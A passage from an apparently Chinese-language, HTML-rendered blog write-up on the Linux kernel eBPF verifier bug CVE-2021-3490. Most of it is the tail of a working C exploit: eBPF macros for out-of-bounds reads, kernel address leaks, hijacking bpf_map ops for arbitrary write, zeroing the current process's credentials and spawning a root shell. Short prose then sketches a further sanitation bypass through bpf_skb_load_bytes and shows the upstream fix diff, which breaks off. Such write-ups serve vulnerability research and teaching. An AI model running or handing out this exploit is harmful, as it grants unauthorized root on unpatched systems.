</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* extend the alu-&gt;limit and do the oob read */ </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_7), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_8, VULN_REG),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_7, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, BPF_REG_8, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, BPF_REG_8),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, __off),        \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_8, BPF_REG_7, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* save the value into map */                   </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_7), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_7, BPF_REG_8, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/* for debug only */
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">read_map_data</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    size_t map_data[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> key;
</span><span style="color:#c0c5ce;">    size_t value[</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Loading value into map...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to load value into map!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; (</span><span style="color:#d08770;">0x110 </span><span style="color:#c0c5ce;">/ </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">); i++) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn prog[] = {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">TRIGGER_VULN</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">MAKE_VULN_REG</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">READ_MAP_DATA</span><span style="color:#c0c5ce;">(map_fd, (</span><span style="color:#d08770;">0x110 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x8 </span><span style="color:#c0c5ce;">* i)), 
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">run_bpf_prog</span><span style="color:#c0c5ce;">(prog, sizeof(prog) / sizeof(prog[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]), </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to run bpf prog!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        key = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_lookup_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to look up the map!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        map_data[i] = value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; (</span><span style="color:#d08770;">0x200 </span><span style="color:#c0c5ce;">/ </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">); i++) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[----data dump----][</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">] </span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i, map_data[i]);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc </span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">argv</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">envp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> map_fd;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> key;
</span><span style="color:#c0c5ce;">    size_t value[</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> log_fd;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[=] CVE-2021-3490 explotation by arttnba3</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[*] Creating new eBPF map...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    map_fd = </span><span style="color:#8fa1b3;">bpf_map_create</span><span style="color:#c0c5ce;">(BPF_MAP_TYPE_ARRAY, </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">, MAP_SIZE, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(map_fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to create eBPF map!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[*] Loading value into map...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to load value into map!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[*] Leaking addr of bpf_map.ops ...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">leak_map_ops_addr</span><span style="color:#c0c5ce;">(map_fd) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to run the eBPF prog!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[*] Checking for leek...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_lookup_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to look up value!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] &lt; </span><span style="color:#d08770;">0xffffffff81000000</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[x] Got bad value: </span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to leak kernel info!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    map_ops_addr = value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    kernel_offset = map_ops_addr - ARRAY_MAP_OPS;
</span><span style="color:#c0c5ce;">    kernel_base += kernel_offset;
</span><span style="color:#c0c5ce;">    init_cred = INIT_CRED + kernel_offset;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] Get array_map_ops leak: </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[34m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[*] kernel_offset: </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, kernel_offset);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] kernel_base: </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, kernel_base);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[*] Leaking addr of bpf_map ...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">leak_map_addr</span><span style="color:#c0c5ce;">(map_fd) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to run the eBPF prog!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[*] Checking for leek...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_lookup_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to look up value!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] &lt; </span><span style="color:#d08770;">0xffff000000000000</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[x] Got bad value: </span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to leak addr of bpf_map!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    map_addr = value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] - </span><span style="color:#d08770;">0x110</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] Get addr of bpf_map: </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, map_addr);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[*] Search for current task_struct&#39;s addr...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    current_task = </span><span style="color:#8fa1b3;">search_for_current_task</span><span style="color:#c0c5ce;">(map_fd);
</span><span style="color:#c0c5ce;">    current_cred = </span><span style="color:#8fa1b3;">read_arbitrary_addr</span><span style="color:#c0c5ce;">(map_fd, current_task + </span><span style="color:#d08770;">0xad8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] Get current task_struct&#39;s addr: </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">           current_task);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] Get current cred&#39;s addr: </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">           current_cred);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[*] Hijacking the bpf_map...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">make_arbitrary_write_ops</span><span style="color:#c0c5ce;">(map_fd);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[*] Overwriting the current-&gt;cred...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; i++) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">arbitrary_write_4_bytes_by_map</span><span style="color:#c0c5ce;">(map_fd, current_cred+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*i, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[31m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[x] Failed to ovwerwrite no.</span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to call ops-&gt;map_push_elem()!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* record the log in to file here */
</span><span style="color:#c0c5ce;">    log_fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">./log.txt</span><span style="color:#c0c5ce;">&quot;, O_RDWR | O_CREAT);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(log_fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to create log file!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(log_fd, bpf_log_buf, </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(bpf_log_buf));
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(log_fd);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">get_root_shell</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="extra-new-alu-sanitation-bypass">Extra. New ALU Sanitation bypass</h3><p>在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0">这个 commit</a> 中 ALU Sanitation 又得到了进一步的加强：</p>
<ul>
<li>alu_limit 的计算方式发生了改变，不是使用指针寄存器的当前位置，而是使用一个 offset 寄存器</li>
<li>被认为是常数的寄存器赋值会被直接更改为常量赋值</li>
</ul>
<p>这两个新特性的引入使得本文所用的攻击方法近乎完全失效
不过 <code>bpf_skb_load_bytes()</code> 会将一个 sk_buff 的数据读到栈上，因此可以利用运行时为 1、verifier 确信为 0 的寄存器构造一个较长的 len 参数，从而使得数据拷贝时发生栈溢出</p>
<pre style="background-color:#2b303b;">
<span style="color:#8fa1b3;">BPF_CALL_4</span><span style="color:#c0c5ce;">(bpf_skb_load_bytes, </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> sk_buff *, skb, u32, offset,
</span><span style="color:#c0c5ce;">	   </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*, to, u32, len)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*ptr;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">unlikely</span><span style="color:#c0c5ce;">(offset &gt; INT_MAX))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_clear;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	ptr = </span><span style="color:#8fa1b3;">skb_header_pointer</span><span style="color:#c0c5ce;">(skb, offset, len, to);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">unlikely</span><span style="color:#c0c5ce;">(!ptr))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_clear;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ptr != to)
</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(to, ptr, len);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">err_clear:
</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(to, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, len);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>不过还需要额外的办法泄露内核地址，一个可行的方式是直接造成 kernel oops 后通过 dmesg 泄露出内核信息，这个技巧对于总会设置 oops=panic 的 CTF 题并不可用，但是大部分的真实世界环境其实都不会在 soft panic 发生时直接 panic （/proc/sys/kernel/panic_on_oops == 0），具备可行性</p>
<h3 id="lou-dong-xiu-fu">漏洞修复</h3><p>在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e">这个 commit</a> 中完成了对漏洞的修补操作,漏洞的修复方式也比较简单，只需要将缺失的设置 32 位边界的操作补充上就行：</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
</span><span style="color:#c0c5ce;">index 757476c91c984..9352a1b7de2dd 100644
</span><span style="color:#c0c5ce;">--- a/kernel/bpf/verifier.c
</span><span style="color:#c0c5ce;">+++ b/kernel/bpf/verifier.c
</span><span style="color:#c0c5ce;">@@ -7084,11 +7084,10 @@ static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,
</span><span style="color:#c0c5ce;"> 	s32 smin_val = src_reg-&gt;s32_min_value;
</span><span style="color:#c0c5ce;"> 	u32 umax_val = src_reg-&gt;u32_max_value;
